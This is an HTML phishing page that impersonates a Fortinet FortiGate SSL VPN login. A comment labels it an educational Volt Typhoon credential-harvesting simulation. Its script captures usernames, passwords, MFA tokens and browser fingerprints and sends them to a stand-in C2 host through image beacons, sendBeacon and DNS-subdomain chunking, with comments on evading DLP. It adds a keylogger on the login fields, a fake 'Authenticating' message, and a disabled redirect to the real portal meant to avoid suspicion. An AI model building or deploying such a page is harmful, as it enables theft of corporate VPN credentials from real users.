<!DOCTYPE html>
<html>
<head>
    <title>FortiGate SSL VPN - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Arial, sans-serif; background: #1a1a2e; color: #e0e0e0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .login-container { background: #16213e; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.4); padding: 40px; width: 400px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .logo svg { width: 180px; height: 40px; }
        .logo-text { color: #da3b01; font-size: 24px; font-weight: bold; }
        .subtitle { color: #888; font-size: 12px; text-align: center; margin-bottom: 25px; }
        .form-group { margin-bottom: 18px; }
        .form-group label { display: block; margin-bottom: 6px; font-size: 13px; color: #aaa; }
        .form-group input { width: 100%; padding: 10px 12px; background: #0f3460; border: 1px solid #1a4280; border-radius: 4px; color: #e0e0e0; font-size: 14px; outline: none; transition: border 0.2s; }
        .form-group input:focus { border-color: #da3b01; }
        .form-group select { width: 100%; padding: 10px 12px; background: #0f3460; border: 1px solid #1a4280; border-radius: 4px; color: #e0e0e0; font-size: 14px; }
        .btn-login { width: 100%; padding: 12px; background: #da3b01; color: white; border: none; border-radius: 4px; font-size: 15px; cursor: pointer; transition: background 0.2s; }
        .btn-login:hover { background: #b83200; }
        .checkbox-group { display: flex; align-items: center; margin-bottom: 20px; gap: 8px; }
        .checkbox-group label { font-size: 12px; color: #888; cursor: pointer; }
        .footer { text-align: center; margin-top: 20px; font-size: 11px; color: #555; }
        .cert-warning { background: #1e3a5f; border: 1px solid #2a5298; border-radius: 4px; padding: 8px 12px; margin-bottom: 15px; font-size: 11px; color: #7bb8f0; }
    </style>
</head>
<body>
    <!-- Volt Typhoon Credential Harvesting Simulation
         This demonstrates a fake VPN login page used to harvest credentials.
         MITRE ATT&CK: T1056.003 (Web Portal Capture)
         FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY -->

    <div class="login-container">
        <div class="logo">
            <span class="logo-text">FORTINET</span>
        </div>
        <div class="subtitle">FortiGate SSL VPN Portal</div>

        <div class="cert-warning">
            Your connection is secured with TLS 1.3. Certificate verified by DigiCert.
        </div>

        <form id="loginForm" onsubmit="return captureCredentials(event)">
            <div class="form-group">
                <label for="realm">Realm</label>
                <select id="realm" name="realm">
                    <option value="corporate">Corporate Network</option>
                    <option value="admin">IT Administration</option>
                    <option value="remote">Remote Access</option>
                </select>
            </div>

            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" autocomplete="off" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>

            <div class="form-group">
                <label for="token">Token Code (if applicable)</label>
                <input type="text" id="token" name="token" placeholder="6-digit token" maxlength="6">
            </div>

            <div class="checkbox-group">
                <input type="checkbox" id="remember" name="remember">
                <label for="remember">Remember my credentials</label>
            </div>

            <button type="submit" class="btn-login">Login</button>
        </form>

        <div class="footer">
            FortiOS v7.4.3 build1994 &copy; Fortinet Inc. All rights reserved.
        </div>
    </div>

    <script>
    // Credential capture and exfiltration simulation
    // In a real attack, this data would be sent to an attacker-controlled server
    function captureCredentials(event) {
        event.preventDefault();

        var data = {
            username: document.getElementById('username').value,
            password: document.getElementById('password').value,
            token: document.getElementById('token').value,
            realm: document.getElementById('realm').value,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            screen: screen.width + 'x' + screen.height,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            language: navigator.language,
            referrer: document.referrer
        };

        // encode for exfiltration
        var encoded = btoa(JSON.stringify(data));

        // method 1: image beacon (most stealthy)
        var img = new Image();
        img.src = 'https://c2.example.com/pixel.gif?d=' + encoded;

        // method 2: navigator.sendBeacon (fire-and-forget)
        if (navigator.sendBeacon) {
            var blob = new Blob([JSON.stringify(data)], {type: 'application/json'});
            navigator.sendBeacon('https://c2.example.com/collect', blob);
        }

        // method 3: DNS exfiltration via subdomain (bypasses most DLP)
        // split encoded data into 63-char chunks for DNS labels
        var chunks = encoded.match(/.{1,63}/g);
        if (chunks) {
            for (var i = 0; i < Math.min(chunks.length, 4); i++) {
                var dnsImg = new Image();
                dnsImg.src = 'https://' + chunks[i] + '.d.c2.example.com/p.gif';
            }
        }

        // show fake "authenticating" to the victim
        document.querySelector('.btn-login').textContent = 'Authenticating...';
        document.querySelector('.btn-login').disabled = true;

        // redirect to real VPN after delay (avoids suspicion)
        setTimeout(function() {
            document.querySelector('.btn-login').textContent = 'Session timeout. Redirecting...';
            // in a real attack, this would redirect to the legitimate VPN portal
            // window.location.href = 'https://real-vpn.target.com/remote/login';
        }, 3000);

        return false;
    }

    // keylogger for pre-submit capture (captures credentials if user tabs away)
    var keyBuffer = '';
    document.addEventListener('keydown', function(e) {
        var active = document.activeElement;
        if (active && (active.id === 'username' || active.id === 'password')) {
            keyBuffer += e.key;
            // flush buffer every 20 keystrokes
            if (keyBuffer.length >= 20) {
                var img = new Image();
                img.src = 'https://c2.example.com/k?f=' + active.id + '&d=' + btoa(keyBuffer);
                keyBuffer = '';
            }
        }
    });
    </script>
</body>
</html>
